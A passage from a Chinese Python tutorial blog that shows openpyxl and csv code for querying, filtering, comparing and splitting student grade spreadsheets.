打印出B1单元格的值</span><span class="token keyword">print</span><span class="token punctuation">(</span>ws_21J3<span class="token punctuation">[</span><span class="token string">'B1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ul><li>工作表对象还有<code>iter_rows()</code>方法，可以获得表中指定范围的数据。</li><li>参数<code>min_row</code>和<code>max_row</code>分别表示最小行索引和最大行索引，参数<code>min_col</code>和<code>max_col</code>分别表示最小列索引和最大列索引。最小行索的值默认为1，最大索引的值默认为表格中有数据的最下面一行的行数。</li><li>参数<code>values_only</code>决定是否返回单元格的值，如果为True则返回<strong>单元格的值</strong>，如果为False则返回<strong>单元格对象</strong>。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 返回第2行至第12行，第2列（B列）至第3列（C列）这个范围的单元格内的所有数据</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> max_row<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> max_col<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-添加数据"><a href="#4-添加数据" class="headerlink" title="4.添加数据"></a>4.添加数据</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 添加数据只能是列表和元祖类型</span>ws_21J3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'新同学'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'55'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 添加完成后必须保存</span>wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>注意，如果要保存文件，别把工作簿打开，会报错。</em></p><h2 id="二、制作查询功能"><a href="#二、制作查询功能" class="headerlink" title="二、制作查询功能"></a>二、制作查询功能</h2><p>查询可以用字典的键值对来实现。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 创建学生信息字典</span>student_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment"># 从第二行开始读取工作表中的信息</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 取出学号</span>    student_number <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># 将信息存入学生信息字典</span>    student_info<span class="token punctuation">[</span>student_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'学号'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'姓名'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'性别'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'成绩'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>student_info<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>student_info<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'姓名'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完善一下交互体验吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 创建学生信息字典</span>students_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment"># 从第二行开始读取工作表中的信息</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 取出学号</span>    student_number <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># 将信息存入学生信息字典</span>    students_info<span class="token punctuation">[</span>student_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'学号'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'姓名'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'性别'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'成绩'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 输入你想查询的员工的工号</span>        student_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输出你想要查询的学号：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请输入数字啊！！！'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 根据学号（键）找到学生信息（值）</span>        student_info <span class="token operator">=</span> students_info<span class="token punctuation">[</span>student_number<span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据表中没有这个学号'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    search_info <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输出你想查询的信息(如：姓名/性别/成绩)：'</span><span class="token punctuation">)</span>    <span class="token comment"># 判断该员工信息是否存在</span>    <span class="token keyword">if</span> student_info<span class="token punctuation">.</span>get<span class="token punctuation">(</span>search_info<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># dict.get()返回指定键的值，如果键不在字典中返回默认值 None 或者设置的默认值。  </span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'经查询，该学生的</span><span class="token interpolation"><span class="token punctuation">{</span>search_info<span class="token punctuation">}</span></span><span class="token string">为</span><span class="token interpolation"><span class="token punctuation">{</span>student_info<span class="token punctuation">[</span>search_info<span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误，只能查询姓名/性别/成绩'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、筛选迟到同学信息"><a href="#三、筛选迟到同学信息" class="headerlink" title="三、筛选迟到同学信息"></a>三、筛选迟到同学信息</h2><p>现需要筛选出迟到时间超过50分钟，并且迟到次数超过3次的同学，并将信息写入一张新的表格。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token punctuation">,</span>Workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment">#获得表头</span>header <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    header<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token comment"># 新建工作簿，存储迟到人员信息</span>new_wb <span class="token operator">=</span> Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>new_ws <span class="token operator">=</span> new_wb<span class="token punctuation">.</span>active  <span class="token comment"># 获得活动工作表（第一张表）</span><span class="token comment"># 先写入表头</span>new_ws<span class="token punctuation">.</span>append<span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token comment"># 从第二行开始依次读取</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    late_time <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>    late_number <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> late_time <span class="token operator">&gt;</span> <span class="token number">50</span> <span class="token keyword">and</span> late_number <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">迟到了</span><span class="token interpolation"><span class="token punctuation">{</span>late_time<span class="token punctuation">}</span></span><span class="token string">分钟，迟到了</span><span class="token interpolation"><span class="token punctuation">{</span>late_number<span class="token punctuation">}</span></span><span class="token string">次。"</span></span><span class="token punctuation">)</span>        new_ws<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>  <span class="token comment"># 将迟到人员的信息写入新表</span><span class="token comment"># 保存文件</span>new_wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./迟到同学信息.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、找出悄悄改成绩的同学"><a href="#四、找出悄悄改成绩的同学" class="headerlink" title="四、找出悄悄改成绩的同学"></a>四、找出悄悄改成绩的同学</h2><p>在录入成绩之前，有同学趁办公室没人，悄悄修改了自己的成绩，为预防这种情况，成绩单还留了一份旧表，现需要对比两张表格，找出那个悄悄改成绩的同学。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token punctuation">,</span>Workbook<span class="token comment"># 打开原来的工作簿、工作表</span>old_wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span>old_ws <span class="token operator">=</span> old_wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 将旧表的信息做成一个字典，字典格式为{姓名:成绩}</span>score_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> row <span class="token keyword">in</span> old_ws<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    score_dict<span class="token punctuation">[</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token comment"># 打开被改动之后工作簿、工作表</span>new_wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表（被悄悄改动过）.xlsx'</span><span class="token punctuation">)</span>new_ws <span class="token operator">=</span> new_wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 将新表中的数据一行行的拿出来对比</span><span class="token keyword">for</span> row <span class="token keyword">in</span> new_ws<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    score <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> score <span class="token operator">!=</span> score_dict<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">的成绩不对，和旧表匹配不上"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据分析2—csv文件读写</title>
      <link href="/2022/03/13/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%902%E2%80%94csv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
      <url>/2022/03/13/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%902%E2%80%94csv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>海盐商贸学校刚进行了Python测验，成绩记录在一张csv表中，但是有的同学发挥失利，成绩不太理想，如果进行公布，势必会伤及自尊。因此，需要把这张csv表进行拆分，每位同学一张表，每张表只有一位同学的成绩。</p><h2 id="二、CSV文件读取"><a href="#二、CSV文件读取" class="headerlink" title="二、CSV文件读取"></a>二、CSV文件读取</h2><h3 id="1-with-open-as-变量名"><a href="#1-with-open-as-变量名" class="headerlink" title="1.with open() as 变量名"></a>1.with open() as 变量名</h3><p><code>with open() as 变量名</code>是<code>open()</code>函数的优化，这种方法最大的不同就是不需要使用 <code>close()</code>函数关闭文件，因为我们总是会忘记关闭文件，导致占用大量系统资源，推荐使用这种方法。</p><h3 id="2-读取为列表"><a href="#2-读取为列表" class="headerlink" title="2.读取为列表"></a>2.读取为列表</h3><p><code>render()</code>函数是csv模块内的一个函数，用于读取csv文件对象，得到一个可迭代对象，该对象里面的每一个元素都是一个列表，每一个列表都对应了csv文件中的一行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csv<span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 读取文件对象，得到reader对象，reader对象是一个可迭代的列表</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>reader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-读取为字典"><a href="#3-读取为字典" class="headerlink" title="3.读取为字典"></a>3.读取为字典</h3><p>和<code>render()</code>函数不同的是，<code>DictReader()</code>实例化之后得到一个字典，字典的键就是表头，这个表头可以通过fieldnames属性得到。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csv<span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 读取文件对象，得到DictReader对象，DictReader对象是一个可迭代的字典，字典的键就是表头</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictReader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token comment"># 可通过fieldnames属性获取表头</span>    headers <span class="token operator">=</span> csv_reader<span class="token punctuation">.</span>fieldnames    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'表头：</span><span class="token interpolation"><span class="token punctuation">{</span>headers<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、CSV文件写入"><a href="#三、CSV文件写入" class="headerlink" title="三、CSV文件写入"></a>三、CSV文件写入</h2><h3 id="1-写入列表数据"><a href="#1-写入列表数据" class="headerlink" title="1.写入列表数据"></a>1.写入列表数据</h3><p>写入文件需要先把<strong>文件对象</strong>转换为<strong>writer对象</strong>，然后调用<strong>writer对象</strong>的<code>writerow()</code>方法将数据写入文件，不过要注意数据必须是一个可迭代的对象，推荐使用列表。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csvstudent_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'小虎'</span><span class="token punctuation">,</span><span class="token string">'55'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'小老虎'</span><span class="token punctuation">,</span> <span class="token string">'75'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./平时成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 将文件对象转换为writer对象</span>    csv_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>writer<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token comment"># 将列表中的元素写入csv文件中</span>    <span class="token keyword">for</span> student <span class="token keyword">in</span> student_list<span class="token punctuation">:</span>        csv_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token comment"># 还有一种方法是writerows()，自己对比区别吧</span>    <span class="token comment"># csv_writer.writerows(student_list)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-写入字典数据"><a href="#2-写入字典数据" class="headerlink" title="2.写入字典数据"></a>2.写入字典数据</h3><p>如果要写入字典类型的数据，需要先将文件对象转换为<strong>DictWriter对象</strong>。<br>不过需要设置字典的键，也就是表头。<br>设置方法就是在实例化<strong>DictWriter</strong>对象时传入参数<code>fieldnames</code>，再调用<code>writeheader()</code>方法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csvstudent_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'姓名'</span><span class="token punctuation">:</span><span class="token string">'小虎'</span><span class="token punctuation">,</span><span class="token string">'成绩'</span><span class="token punctuation">:</span><span class="token string">'65'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">'姓名'</span><span class="token punctuation">:</span><span class="token string">'小老虎'</span><span class="token punctuation">,</span><span class="token string">'成绩'</span><span class="token punctuation">:</span><span class="token string">'85'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token comment"># 设置表头</span>headers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'姓名'</span><span class="token punctuation">,</span> <span class="token string">'成绩'</span><span class="token punctuation">]</span><span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./平时成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 将文件对象转换为DictWriter对象</span>    csv_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> fieldnames<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token comment"># 写入表头</span>    csv_writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 将列表中的元素写入csv文件中</span>    <span class="token keyword">for</span> student <span class="token keyword">in</span> student_list<span class="token punctuation">:</span>        csv_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>student<span class="token punctuation">)</span>    <span class="token comment"># 还有一种方法是writerows()，自己对比区别吧</span>    <span class="token comment"># csv_writer.writerows(student_list)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、完成项目"><a href="#四、完成项目" class="headerlink" title="四、完成项目"></a>四、完成项目</h2><h3 id="1-用列表类型完成"><a href="#1-用列表类型完成" class="headerlink" title="1.用列表类型完成"></a>1.用列表类型完成</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> asyncore <span class="token keyword">import</span> write<span class="token keyword">import</span> csvresult_path <span class="token operator">=</span> <span class="token string">'./拆分结果/'</span><span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>reader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        save_path <span class="token operator">=</span>result_path <span class="token operator">+</span> csv_row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.csv'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>        <span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建(注意文件夹不会自动创建)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>save_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> save_file<span class="token punctuation">:</span>            <span class="token comment"># 将文件对象转换为DictWriter对象</span>            save_file_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>writer<span class="token punctuation">(</span>save_file<span class="token punctuation">)</span>            <span class="token comment"># 将列表中的元素写入csv文件中</span>            save_file_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-用字典类型完成（推荐）"><a href="#2-用字典类型完成（推荐）" class="headerlink" title="2.用字典类型完成（推荐）"></a>2.用字典类型完成（推荐）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csvresult_path <span class="token operator">=</span> <span class="token string">'./拆分结果/'</span><span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token 